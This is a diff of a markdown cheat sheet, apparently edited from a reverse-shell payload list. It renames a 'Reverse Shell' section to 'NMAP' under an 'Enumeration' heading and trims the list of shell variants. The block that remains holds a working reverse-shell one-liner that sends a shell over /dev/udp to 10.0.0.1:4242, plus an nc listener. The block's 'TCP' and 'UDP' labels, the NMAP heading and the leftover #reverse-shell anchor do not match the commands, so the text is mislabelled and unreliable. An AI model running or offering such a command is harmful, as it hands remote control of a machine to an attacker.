@@ -1,24 +1,17 @@
 # Enumeration
 
 ## Summary
-* [Reverse Shell](#reverse-shell)
+* [NMAP](#reverse-shell)
     * [Bash TCP](#bash-tcp)
-    * [Bash UDP](#bash-udp)
-    * [Socat](#socat)
-    * [Perl](#perl)
-    * [Python](#python)
-    * [PHP](#php)
-    * [Ruby](#ruby)
-    * [Golang](#golang)
-
+ 
 
 ### NMAP
 
-```bash
-Victim:
+```
+TCP:
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 
-Listener:
+UDP:
 nc -u -lvp 4242
 ```
 ### UDP
